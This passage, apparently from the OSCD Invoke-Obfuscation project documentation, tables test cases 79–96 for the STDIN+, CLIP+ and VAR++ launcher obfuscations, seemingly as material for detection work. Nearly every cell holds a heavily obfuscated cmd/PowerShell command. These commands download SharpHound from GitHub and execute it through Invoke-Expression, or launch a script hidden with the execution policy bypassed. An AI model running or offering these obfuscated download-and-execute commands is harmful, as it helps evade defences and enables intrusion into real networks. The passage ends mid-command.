| 79 | LAUNCHER | LAUNCHER\STDIN+ | LAUNCHER\STDIN+\6 | cmD/C   " echO Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound  \| pOWeRsHELl -WindowstY hIddEn   ${exEcuTIONConTEXt}.inVOkecoMMAND.iNVOKEScRiPT(  ${InPut} )" | CmD  /c " Echo\powershell.exe -executionpolicy bypass –noprofile –windowstyle hidden –file script.ps1 \|  poWERsHeLl -c   ^& ( $SHelliD[1]+$ShelLID[13]+'X') ( ${inpUt}) "
| 80 | LAUNCHER | LAUNCHER\STDIN+ | LAUNCHER\STDIN+\7 | C:\wIndoWS\sYstEM32\Cmd.exe   /c  "  eCHo Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound  \| PoWErsHelL  -EXeCutIOnPOL BYpaSs   $ExeCUtiOncOnteXt.InVokecOmMaND.InvOKeScRIpT(  ${InPUt}  )" | Cmd.ExE  /c  " ECho/powershell.exe -executionpolicy bypass –noprofile –windowstyle hidden –file script.ps1 \|  pOwERsHeLL -exeCutIOnP byPAss   ${ExeCUtIoNCONTeXT}.INvOKecOmmANd.inVOkESCRiPT(  $InPut)"
| 81 | LAUNCHER | LAUNCHER\STDIN+ | LAUNCHER\STDIN+\8 | Cmd.exe/C   "  echo/Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound  \| C:\WIndOWs\sySWoW64\wIndOWSpowERSHELl\v1.0\powERsHeLl.EXE  (gET-chiLDITeM 'VaRIABle:eX*XT').VALue.invOkeCoMMand.inVOKEscRIPT($InpUt )" | cMd  /C"EchO/powershell.exe -executionpolicy bypass –noprofile –windowstyle hidden –file script.ps1 \|  c:\WINdOWs\sYsWOW64\windoWspOWeRshELL\V1.0\PowERShElL.eXE   ${exeCUTIoNconTeXt}.InvOKeCoMManD.inVOKescriPt(${input})"

### CLIP+ LAUNCHER OBFUSCATION
[Back to the Contents :page_facing_up:](https://github.com/zinint/oscd_Invoke-Obfuscation/blob/master/OSCD%20-%20Issue%20-%20Invoke-Obfuscation.md#contents)
| Case # | Option #1 | Option #2 | Option #3 | Command #1 Result | Command #2 Result |
| :---: | :---: | :---: | :---: | :--- | :--- |
| 82 | LAUNCHER | LAUNCHER\CLIP+ | LAUNCHER\CLIP+\0 | cMD.exe   /C   "eCHo Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound\| c:\WinDOWS\sYSTEM32\clIP.ExE&& PowErshEll -St   ${0`zhn}=[System.Reflection.Assembly]::(\"{4}{1}{3}{0}{2}\" -f'r',(\"{1}{0}\"-f'i','adW' ),( \"{0}{1}{2}\"-f't','i','alName'  ),(  \"{1}{0}\" -f'a','thP' ),'Lo'  ).\"invo`Ke\"(  (\"{2}{3}{0}{4}{1}\" -f 'em.','dows.Forms','S','yst','Win'  ) )   ; ${eXeCutiOnContEXt}.\"iNVOkECom`m`And\".\"i`NvOkESCr`IpT\"(   ( [sysTEm.WiNDoWs.foRmS.cLIpBOArd]::(\"{0}{1}\" -f'G',( \"{0}{1}\" -f'eT','TExt' )).\"i`Nv`Oke\"(  ) ) )   ; [System.Windows.Forms.Clipboard]::( \"{1}{0}\"-f 'ar','Cle' ).\"in`VOke\"(  )" | c:\WINDowS\sySTeM32\CMd  /C"EcHo powershell.exe -executionpolicy bypass –noprofile –windowstyle hidden –file script.ps1\| cLIP.ExE &&  poWersHElL  -sTA      ^&(\"{1}{2}{0}\"-f 'e',(  \"{0}{1}\" -f 'Add','-T'  ),'yp'  ) -AssemblyNam (\"{0}{1}{2}{5}{3}{4}\"-f'Sy','ste','m',(  \"{1}{0}\" -f 's.F','dow' ),(  \"{0}{1}\" -f'o','rms'  ),( \"{0}{1}\" -f'.Wi','n')  )  ;   .   ((  ^&  (\"{0}{1}\" -f (  \"{0}{1}\"-f'VArIa','BL' ),'e') ( \"{0}{1}\"-f '*','mdR*'  )  ).\"N`AMe\"[3,11,2]-JOIn''  ) (   ([WiNDOwS.fORmS.cliPboaRD]::( \"{0}{1}\" -f(  \"{1}{0}\" -f'E','getT'),'XT'  ).\"i`NV`Oke\"(  ))  )  ;  [Windows.Forms.Clipboard]::(  \"{0}{2}{1}\" -f 'S','t',( \"{0}{1}\" -f'et','Tex'  )  ).\"Inv`OKE\"( ' '  )"
| 83 | LAUNCHER | LAUNCHER\CLIP+ | LAUNCHER\CLIP+\1 | c:\WIndoWs\sYsTEM32\cmD.ExE   /c  "eCHo/Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound \|ClIp.eXe && PoWeRShelL  -NOeX -St   ${x`Li} =  [Reflection.Assembly]::( \"{3}{1}{0}{5}{2}{4}\"-f 'ith','W','am',(  \"{1}{0}\" -f 'ad','Lo'),'e',(\"{1}{0}{2}\"-f 'art','P','ialN')  ).\"I`NvOKE\"(  ( \"{1}{3}{0}{2}\"-f'For','System.Win','ms','dows.')) ;   ^&  ( \"{1}{0}\"-f 'X','iE'  )(([System.windoWS.forms.cLIpBoARD]::(  \"{2}{1}{0}\"-f'T',(  \"{0}{1}\"-f'E','ttEX'  ),'g').\"INv`OKe\"(  )))   ; [System.Windows.Forms.Clipboard]::(  \"{0}{1}\"-f (  \"{1}{0}\" -f 'tTe','Se' ),'xt'  ).\"in`VoKe\"(  ' ')" | CMd.eXE/c  "EchO/powershell.exe -executionpolicy bypass –noprofile –windowstyle hidden –file script.ps1\|cliP.ExE &&  powERSHelL -sT -nOe   ^&  ( \"{1}{2}{0}\"-f( \"{1}{0}\"-f 'e','-Typ' ),'A','dd') -AssemblyN (\"{0}{3}{1}{2}{4}\"-f'Sy',( \"{0}{1}\" -f 'm.','Wind' ),( \"{0}{1}{2}\" -f 'o','w','s.Fo' ),'ste','rms')    ;     . (  ${Sh`e`LlId}[1] + ${SHE`l`Lid}[13]+'x'  ) (  (  [SYStem.wINDOws.fOrmS.cLipbOArD]::(  \"{2}{1}{0}\"-f'xt',(  \"{0}{1}\"-f 'e','ttE'  ),'g').\"iNVO`kE\"(  )))   ;    [System.Windows.Forms.Clipboard]::(\"{1}{0}\"-f( \"{2}{0}{1}\" -f 'tT','ext','e'),'S'  ).\"InV`OkE\"(  ' ' )"
| 84 | LAUNCHER | LAUNCHER\CLIP+ | LAUNCHER\CLIP+\2 | C:\WinDOws\sYstEM32\Cmd  /C " ecHo Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound \| c:\wINdOWS\SyStEm32\CLiP.eXE&& PowerSHeLl  -sTA  -NonIntera     . (\"{2}{0}{1}\" -f( \"{1}{0}\"-f 'd-Ty','d'),'pe','A'  ) -Assembly (\"{0}{3}{1}{4}{2}\"-f( \"{1}{0}\"-f 'resen','P'  ),'t','ore','ta',(\"{0}{1}\" -f'io','nC'  )  )  ;  (  [SysTeM.wINDoWS.clIpBoArd]::( \"{1}{0}\" -f(  \"{0}{1}\"-f'ttEX','T'),'GE'  ).\"i`NVOKE\"(    )  )   ^\|   . (  \"{0}{1}\"-f'ie','X')    ;   [System.Windows.Clipboard]::( \"{1}{0}\" -f'r',(\"{0}{1}\"-f 'C','lea')  ).\"InVO`kE\"(  )" | cmD.EXe/c   "EcHO/powershell.exe -executionpolicy bypass –noprofile –windowstyle hidden –file script.ps1\| cLip&&  powERsHeLL -ST  -NoninteRaC  [Void][Reflection.Assembly]::(  \"{1}{0}{2}{5}{3}{4}\"-f'adW','Lo','i',( \"{1}{0}\" -f'Nam','tial'),'e',(\"{1}{0}\" -f 'hPar','t'  )).\"InVo`kE\"(  ( \"{3}{0}{2}{1}\"-f 'yste','ows.Forms','m.Wind','S'  ) )    ; .  (  ${E`NV:`cOms`peC}[4,15,25]-join'' ) ( ([WiNDoWs.FORMS.cLIpBoaRd]::(  \"{2}{1}{0}\" -f ( \"{0}{1}\" -f'te','Xt'),'t','ge' ).\"i`NVokE\"(  ) )  )   ;    [Windows.Forms.Clipboard]::( \"{0}{1}{2}\" -f'S','etT','ext' ).\"INV`oKE\"(' ' )"
| 85 | LAUNCHER | LAUNCHER\CLIP+ | LAUNCHER\CLIP+\3 | CMd.Exe  /C   "  echO\Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound\|CLip.EXE&& poweRSHeLl  -noloG  -sT  ^& (\"{2}{0}{1}\"-f( \"{1}{0}\" -f 'p','dd-Ty' ),'e','A') -Assembly ( \"{0}{4}{3}{2}{1}\"-f'Sys',(  \"{1}{2}{0}\"-f 'rms','s.F','o'),(\"{1}{0}\" -f'ow','ind'),'m.W','te'  )   ;  ${EXEC`UT`ioNc`ONTexT}.\"I`NVoK`eC`OMm`ANd\".\"InvokeSC`RI`pT\"(  (  [WiNDOwS.FOrms.CLipboARd]::(  \"{1}{0}\"-f (\"{1}{0}\"-f 'Xt','tte'  ),'gE'  ).\"i`NvOKe\"( )  ) ) ;  [Windows.Forms.Clipboard]::(  \"{0}{1}\" -f( \"{1}{0}\" -f 'lea','C'  ),'r' ).\"INVo`KE\"()" | cmD.EXE  /C  " EchO powershell.exe -executionpolicy bypass –noprofile –windowstyle hidden –file script.ps1 \|cLIp.EXE &&  PoWERSHEll -stA  -NoL   ^& (  \"{1}{0}\" -f ( \"{2}{0}{1}\" -f'Typ','e','d-' ),'Ad' ) -Assembly ( \"{3}{1}{2}{0}\"-f'ore','res',( \"{1}{0}{2}\"-f 't','enta','ionC'),'P'  )    ;   ( [WinDoWs.cLipBOARd]::( \"{0}{1}\"-f'G',(  \"{2}{1}{0}\"-f't','tTEx','E' )).\"IN`VoKE\"()  )  ^\|.(   ${Sh`elL`iD}[1]+${sHEl`LId}[13]  + 'X'  )  ; [Windows.Clipboard]::(  \"{1}{0}\"-f 'xt',( \"{0}{1}\" -f'Set','Te' ) ).\"In`VO`Ke\"(  ' ')"
| 86 | LAUNCHER | LAUNCHER\CLIP+ | LAUNCHER\CLIP+\4 | cmD/c   " echO\Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound\| c:\wINdOws\SYstem32\Clip &&  pOwersHeLL -ST  -nOpROFIl     . (  \"{0}{2}{1}\" -f (\"{0}{1}\" -f'Add','-' ),'pe','Ty') -Assem (  \"{1}{3}{2}{0}\"-f (  \"{0}{2}{1}\"-f 'io','e','nCor'  ),'Pre','t',(  \"{0}{1}\" -f 'se','nta')  )  ; ${EXEcUTIoNContExT}.\"i`NV`okECommanD\".\"I`NVoKE`SCRI`pT\"(  ([SYsTeM.WindOws.CliPBOarD]::( \"{0}{1}{2}\" -f( \"{0}{1}\" -f'GET','t' ),'e','xT').\"IN`VokE\"(  )  )   )  ; [System.Windows.Clipboard]::( \"{0}{1}{2}\" -f'Set','Te','xt').\"I`NvOKE\"( ' ')" | c:\WiNDoWs\sYSTEm32\CMd.ExE   /c "echO/powershell.exe -executionpolicy bypass –noprofile –windowstyle hidden –file script.ps1\| C:\WiNdOwS\SYsTem32\clIP&&  PoweRSHeLl  -Nop  -stA   [Void][System.Reflection.Assembly]::(\"{4}{3}{1}{2}{0}\"-f(  \"{1}{0}\" -f 'ame','N'),'ith',( \"{0}{2}{1}\" -f 'Par','al','ti' ),'W',( \"{1}{0}\"-f'ad','Lo' )  ).\"i`NVoKe\"( (  \"{4}{3}{0}{2}{1}\"-f'e','ws.Forms','m.Windo','yst','S'  )  );    ${ex`Ec`UTIOncONt`ExT}.\"iNvOKEc`omMa`Nd\".\"InvOkES`C`R`Ipt\"(  ([sYSTEm.winDOWs.FoRMs.clipboARD]::(  \"{0}{1}\"-f ( \"{1}{0}\" -f'Tte','GE' ),'xT').\"iNV`O`ke\"(   ) )    )   ;  [System.Windows.Forms.Clipboard]::(  \"{1}{0}\" -f 'ear','Cl').\"iN`VOKE\"(   )"
| 87 | LAUNCHER | LAUNCHER\CLIP+ | LAUNCHER\CLIP+\5 | CMd.eXe /c   "  EcHo/Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound \|C:\WindoWS\systEM32\cLiP && pOWerSheLL -st  -CommANd      ^&( \"{1}{0}\"-f'e',( \"{2}{1}{0}\" -f 'p','Ty','Add-'  ) ) -AssemblyN (\"{1}{2}{0}\"-f (  \"{2}{1}{0}\" -f're','Co','tion' ),(  \"{1}{0}{2}\"-f'en','Pres','t'  ),'a')   ;  ${exeCUTIon`c`on`T`Ext}.\"invO`KECo`mm`And\".\"iNVO`kE`ScriPt\"(  ( [SYsTeM.WInDoWS.ClipBOaRD]::(\"{0}{1}\" -f'gEt',( \"{0}{1}\"-f'te','xT')).\"INVo`KE\"(  )  )   )  ;  [System.Windows.Clipboard]::(\"{0}{1}\" -f (\"{0}{2}{1}\" -f'Se','x','tTe' ),'t').\"iN`VOke\"(' ')" | Cmd.exe /C "  EcHo powershell.exe -executionpolicy bypass –noprofile –windowstyle hidden –file script.ps1 \|cLiP.eXe && PowersHeLL  -stA -C     .( \"{1}{2}{0}\"-f 'e','A',( \"{0}{1}\" -f'dd-T','yp'  ) ) -Asse ( \"{2}{4}{1}{3}{0}\" -f 'ms','.Wi',(  \"{0}{1}\"-f'S','yste'),(  \"{0}{2}{1}\" -f'ndow','For','s.'),'m') ;     ^&   (  ${She`lL`Id}[1] +${SHel`l`Id}[13] +  'X'  )(   ([SYsTem.WindOWS.formS.CLipBOArd]::(  \"{0}{1}\"-f 'G',( \"{0}{2}{1}\"-f 'ETTE','t','x')).\"iN`VoKE\"()  ))  ; [System.Windows.Forms.Clipboard]::(  \"{1}{0}\"-f( \"{0}{1}\"-f'l','ear'  ),'C' ).\"IN`Voke\"(  )"
| 88 | LAUNCHER | LAUNCHER\CLIP+ | LAUNCHER\CLIP+\6 | cMD   /c " ecHo Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound \|C:\WindOWS\system32\cLiP&&  POwErShELL  -Sta  -wINDOwStylE  hidDEn  [Void][System.Reflection.Assembly]::( \"{0}{1}{4}{2}{3}\"-f ( \"{1}{0}\"-f'dW','Loa'  ),'i','a',(\"{1}{0}\" -f'Name','l'),( \"{0}{1}\" -f'thPart','i')).\"Inv`oKe\"(  ( \"{0}{2}{5}{4}{1}{3}\" -f 'Sys','rm','tem.Window','s','.Fo','s') )   ;  ${ExEcUTIONcoNtEXT}.\"iNVOKE`Com`m`A`Nd\".\"Inv`oKeS`CrI`pT\"(( [syStem.winDOws.fOrMs.ClIPbOaRd]::(  \"{0}{2}{1}\" -f 'Ge','Xt','Tte').\"i`NVoke\"())  )  ; [System.Windows.Forms.Clipboard]::(\"{1}{0}{2}\"-f(\"{1}{0}\"-f'x','etTe'),'S','t').\"i`NvOkE\"(  ' ' )" | C:\WInDows\sYSTEm32\cMD.Exe  /C"  ECho powershell.exe -executionpolicy bypass –noprofile –windowstyle hidden –file script.ps1\| CLiP && POwersHeLl -WindOwStYle  hIDdeN  -STA   ${nU`Ll} =  [System.Reflection.Assembly]::( \"{2}{0}{3}{1}\"-f'oad','e','L',(  \"{1}{2}{0}\" -f'lNam','WithParti','a' )  ).\"I`N`VOKE\"(  ( \"{2}{3}{1}{4}{0}{5}\"-f 'ws','d','System.','Win','o','.Forms')  )   ;  ${ExeCutioNcOnTexT}.\"inVokE`Co`MmaND\".\"In`Vo`kEsCR`iPT\"(   (  [SystEm.wIndOWs.FoRMS.CLIpBoARD]::( \"{0}{1}{2}\"-f 'g','et',(  \"{0}{1}\" -f'tE','XT' )  ).\"iN`V`oke\"(  ) )  )   ;    [System.Windows.Forms.Clipboard]::(\"{2}{1}{0}\" -f 'xt','e',( \"{1}{0}\"-f'T','Set' )  ).\"In`VoKe\"(  ' ')"
| 89 | LAUNCHER | LAUNCHER\CLIP+ | LAUNCHER\CLIP+\7 | Cmd  /C  "  ECHO\Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound\|c:\WINDOWs\sysTem32\cLip&&  PowErShELL -St -exEcuTioNpoLic  BYPaSs    .  (\"{1}{0}\"-f 'e',(\"{1}{0}\" -f'-Typ','Add')  ) -AssemblyNa (  \"{0}{2}{1}{3}\" -f ( \"{2}{1}{0}\" -f 'i','.W','System'  ),'m',( \"{2}{0}{1}\" -f'Fo','r','ndows.'),'s') ; ${eXECUtiONcONTExt}.\"Inv`OKE`c`oMMAnD\".\"iN`VO`keSCRi`pt\"( (  [wiNdows.forms.cLIPBoaRD]::( \"{0}{1}\"-f (\"{0}{1}\" -f 'G','ETT'),'EXT'  ).\"iN`V`OkE\"(   ) )  )    ;    [Windows.Forms.Clipboard]::(\"{1}{0}\"-f'ar','Cle'  ).\"InvO`Ke\"(  )" | C:\WIndows\system32\cMd  /C "  EcHo powershell.exe -executionpolicy bypass –noprofile –windowstyle hidden –file script.ps1\| c:\wINdoWs\SySTeM32\CLip&& powErSHElL -EXECUTiO BYpASs -STA   . ( \"{1}{0}{2}\" -f 'd-','Ad',( \"{1}{0}\" -f'ype','T' )  ) -Assemb (  \"{3}{1}{2}{6}{4}{5}{0}\" -f'rms','e','m',(\"{1}{0}\"-f'st','Sy' ),( \"{1}{0}{2}\" -f'ws','ndo','.'),'Fo','.Wi' )  ;   .  (  ${Psh`OME}[4]  + ${P`S`HOme}[30]  + 'X')(  (  [WINdOws.forms.ClipbOaRD]::(\"{1}{0}\"-f 'ExT',(  \"{1}{0}\" -f 'tT','Ge' )).\"INvo`kE\"(   )) )  ;    [Windows.Forms.Clipboard]::( \"{1}{0}\" -f( \"{0}{1}\" -f 'Te','xt'),'Set').\"IN`V`oKe\"(  ' ')"
| 90 | LAUNCHER | LAUNCHER\CLIP+ | LAUNCHER\CLIP+\8 | cMd.eXE   /c  " echo/Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound \|cLIP && C:\WiNDows\sYSWow64\WiNdowsPoweRsHEll\V1.0\PowErsHEll.exe  -STA    .(  \"{2}{1}{0}\" -f'pe','-Ty','Add') -Assemb (  \"{2}{3}{4}{0}{1}\"-f'o',( \"{0}{1}\"-f 'nCor','e'  ),'P',(\"{1}{0}\"-f 'ese','r'),(\"{1}{0}\"-f 'tati','n' )  )  ;  ${EXECutI`onco`N`TE`XT}.\"iNVokecOm`M`AnD\".\"INvoKe`S`cRI`pt\"( ( [WIndOwS.ClipBoARd]::( \"{0}{1}{2}\"-f 'G','ett','ExT').\"iN`VO`KE\"(  )  )   )    ; [Windows.Clipboard]::( \"{2}{0}{1}\"-f (\"{0}{1}\" -f 'et','Te'),'xt','S').\"i`NVOKe\"( ' ' )" | c:\wIndOWs\SystEm32\CMD   /c"eCho powershell.exe -executionpolicy bypass –noprofile –windowstyle hidden –file script.ps1 \| CliP &&  C:\wINDowS\sYSwow64\wINDowSPOWErshELL\V1.0\POWERsheLl.Exe -STa   ${o9`4TE}  =  [Reflection.Assembly]::( \"{4}{1}{3}{2}{0}\"-f(\"{1}{0}\"-f'lName','ia' ),(\"{1}{0}\" -f'h','adWit'  ),'t','Par','Lo' ).\"I`NvOKE\"((  \"{3}{4}{0}{1}{5}{2}{6}\"-f'm.','Windows.','orm','Sys','te','F','s' )) ;   ([windows.fORMS.CLiPBOArd]::(\"{2}{1}{0}\"-f 'xt',(\"{1}{0}\" -f 'tE','Et' ),'g').\"I`NVo`Ke\"(  )) ^\|   .  (\"{0}{5}{3}{2}{1}{4}\"-f'i','pR',(  \"{0}{1}\" -f'KE-e','X'),'o',(\"{1}{2}{0}\"-f'N','e','ssIo'  ),'nv'  ) ;   [Windows.Forms.Clipboard]::( \"{1}{0}{2}\" -f'e','S',( \"{1}{0}\"-f 'Text','t'  )).\"INvo`KE\"(  ' ' )"

### VAR++ LAUNCHER OBFUSCATION
[Back to the Contents :page_facing_up:](https://github.com/zinint/oscd_Invoke-Obfuscation/blob/master/OSCD%20-%20Issue%20-%20Invoke-Obfuscation.md#contents)
| Case # | Option #1 | Option #2 | Option #3 | Command #1 Result | Command #2 Result |
| :---: | :---: | :---: | :---: | :--- | :--- |
| 91 | LAUNCHER | LAUNCHER\VAR++ | LAUNCHER\VAR++\0 | cmd.exe   /c   "sEt  oezf=Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound&&Set  pcS=pOwErshELl      ( ^^^& ('Ls'  ) (  \"{0}{2}{1}\"-f 'en','oeZf','V:' )).\"vAl`Ue\"  ^^^|   .(  (.(  \"{2}{0}{1}\"-f '-vARI','ABLe','GeT') (  \"{1}{0}\" -f'r*','*MD' )  ).\"N`AmE\"[3,11,2]-joIn''  )&&cmd.exe   /c%pCs%" | Cmd.EXE   /c "seT   Cyrk=powershell.exe -executionpolicy bypass –noprofile –windowstyle hidden –file script.ps1&&sEt   mZT=pOWeRShElL    ^^^& (  \"{0}{2}{1}\"-f 'set-i','em','T')  (  \"{2}{4}{0}{1}{3}\"-f 'e:G','PXYz','vaRi','0','ABl'  ) ( [typE](\"{1}{2}{0}\" -F'Ent','e','nvIroNM' )    )    ;     .(  ${p`SHOME}[4] +  ${P`sh`OME}[34] +  'X')(   (   (    . (  \"{1}{0}{2}\" -f'aRia','V','Ble') (  \"{1}{0}{2}\" -f 'P','g','XYZ0' )  -valUeO  )::(  \"{4}{5}{2}{1}{6}{0}{3}\"-f'A','OnM','R','rIaBle','GEten','vI','eNTv' ).Invoke(  (  \"{1}{0}\"-f 'RK','Cy'),(  \"{1}{0}\" -f'esS','Proc')  )  ) ) && Cmd.EXE   /c%MZt%"
| 92 | LAUNCHER | LAUNCHER\VAR++ | LAUNCHER\VAR++\1 | c:\WINDOWS\sYSTEm32\cmd.Exe   /c"sEt  BvX=Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound&&SEt  Gkr=PoWErShEll  -NOex    ${eXecutIOnCoNTEXT}.\"INVok`EcO`mmA`ND\".(  \"{0}{2}{1}{3}\"-f 'in','sc','VOKE','RIpT' ).Invoke( (   ^^^&  ('LS' ) (\"{0}{1}\"-f'E','NV:bVx' )  ).\"V`ALuE\"   )&& c:\WINDOWS\sYSTEm32\cmd.Exe   /c %GKR%" | C:\wiNDOWs\SySTEM32\cmD.EXe  /c  "sET   EGV=powershell.exe -executionpolicy bypass –noprofile –windowstyle hidden –file script.ps1&&SEt  fmsz=POwerShElL  -NOeXIT     Sv ( \"6U\" + \"Q\") (  [TYPE](\"{1}{2}{0}\"-F 'IRONMent','E','nv' )  )    ;  . (  ${pSHo`mE}[21]+ ${PS`Ho`me}[30] +'X')(  (    (  VarIABle  ( \"6U\"  +\"Q\" )  ).VAlUe::( \"{2}{0}{1}{3}\"-f'onMe','n','GETeNvir','tVAriablE' ).Invoke('Egv',(  \"{1}{0}\" -f 'eSS','prOC') ) )  ) &&C:\wiNDOWs\SySTEM32\cmD.EXe  /c %fmSz%"
| 93 | LAUNCHER | LAUNCHER\VAR++ | LAUNCHER\VAR++\2 | cmD /c   "SeT  GcAd=Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound&&SEt   MuGc=pOWerShEll -NoNi     ${ExeCUTiONConteXT}.\"IN`VOkECoM`M`ANd\".(  \"{2}{1}{0}\" -f'cRIPt','OKES','inv').Invoke((  ^^^& (\"{0}{1}\" -f 'ItE','M'  ) ( \"{1}{0}{2}\" -f'A','enV:GC','D'  ) ).\"V`ALue\"   )&& cmD /c%mugc%" | C:\wINdowS\systeM32\CmD.EXE  /C "SEt  JHo=powershell.exe -executionpolicy bypass –noprofile –windowstyle hidden –file script.ps1&&sEt   ReS=POwersHElL -NONintEracTiVe       Sv ( \"a\"+\"3Xv\")  (  [TypE](  \"{2}{1}{0}\" -f 'Nt','ironME','ENv')   ) ;   (    (   GET-VARiaBle  ( \"a\"+  \"3xv\")  -vALueO    )::( \"{4}{2}{0}{3}{1}\"-f'mEN','ablE','ON','tVARi','GETenvIr'  ).Invoke(  'jho',(  \"{0}{1}{2}\" -f'PrOce','S','S'  )  ))   ^^^|    ^^^&  (  \"{4}{2}{0}{1}{3}\"-f'Ok','e-','v','ExpreSSIOn','iN' )&&C:\wINdowS\systeM32\CmD.EXE  /C%reS%"
| 94 | LAUNCHER | LAUNCHER\VAR++ | LAUNCHER\VAR++\3 | cMD.EXe  /c   "seT   oTsMr=Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound&&Set   ost=poWERshell  -noLOg     ${eXeCUtIonCONtEXT}.\"I`NVoKecomMa`Nd\".(\"{1}{3}{0}{2}\"-f'okesc','In','RiPt','V' ).Invoke((   ^^^& (\"{0}{1}\" -f 'IT','eM'  ) ( \"{1}{0}{2}\"-f':o','EnV','tSmR'  ) ).\"va`Lue\"  )&&   cMD.EXe  /c %OST%" | C:\WINDOWs\systeM32\CMD  /C  "sEt  nztm=powershell.exe -executionpolicy bypass –noprofile –windowstyle hidden –file script.ps1&&Set   rOGjM=PoweRSheLL -nOL      ^^^&( (.( 'GV' ) (  \"{1}{0}\" -f'R*','*MD'  )  ).\"NA`Me\"[3,11,2]-JoiN'') ((  .(  \"{1}{0}\" -f'M','ITE' ) (\"{0}{2}{1}\" -f 'e','ZtM','nv:N') ).\"VAL`Ue\"  )&&C:\WINDOWs\systeM32\CMD  /C %RoGJm%"
| 95 | LAUNCHER | LAUNCHER\VAR++ | LAUNCHER\VAR++\4 | CMD.EXE   /C  "Set   Jgxw=Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound&&Set   DiS=pOWeRSHELL  -noPRoF    .  ( \"{2}{4}{3}{0}{1}\" -f'ssIO','N','inv','E','okE-EXPr'  )(  (  ^^^&( \"{1}{2}{0}\"-f 'm','gEt-','ite'  ) ( \"{1}{0}\" -f 'w','ENV:jGX' ) ).\"vAL`UE\"   )&& CMD.EXE   /C%dIs%" | CMD  /C  "set   jgF=powershell.exe -executionpolicy bypass –noprofile –windowstyle hidden –file script.ps1&&Set  hvuJ=pOweRSHELL  -NOPrO     (  .(\"{0}{1}\" -f'G','cI' ) ( \"{2}{1}{0}\"-f 'Gf','v:j','en')).\"V`AluE\"  ^^^|  ^^^& (   ${V`eR`BosEPREfeR`e`Nce}.( \"{1}{0}\"-f 'g','tostRiN').Invoke(  )[1,3]  + 'x'-JoIn''  )&&  CMD  /C%HVUj%"
| 96 | LAUNCHER | LAUNCHER\VAR++ | LAUNCHER\VAR++\5 | c:\wINdoWS\sySTEM32\cMd.exe   /C "SET   eDKU=Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound&&Set   AmX=POweRsHell  -cO    ( .('lS'  ) (\"{0}{2}{1}\"-f 'e',':edKu','Nv'  ) ).\"Val`Ue\"  ^^^|  ^^^&  ( ${s`heLl`Id}[1]+${s`hEL`LID}[13]  +'X'  )&& c:\wINdoWS\sySTEM32\cMd.exe   /C%Amx%" | c:\wINDows\SYsTeM32\Cmd  /C   "SEt  UbSA=powershell.exe -executionpolicy bypass –noprofile –windowstyle hidden –file script.ps1&&SeT   hwACB=POwErsHeLl  -comMAnd    (.(\"{1}{0}\" -f'i','gC') (  \"{0}{3}{1}{2}\"-f'Va','b','LE:EX*Xt','RiA'  )).\"V`AluE\".\"inV`oK`eco`m`mANd\".(\"{0}{1}{3}{2}\" -f 'In','VO','pt','KeSCRi'  ).Invoke( (.( \"{0}{1}{3}{2}\"-f 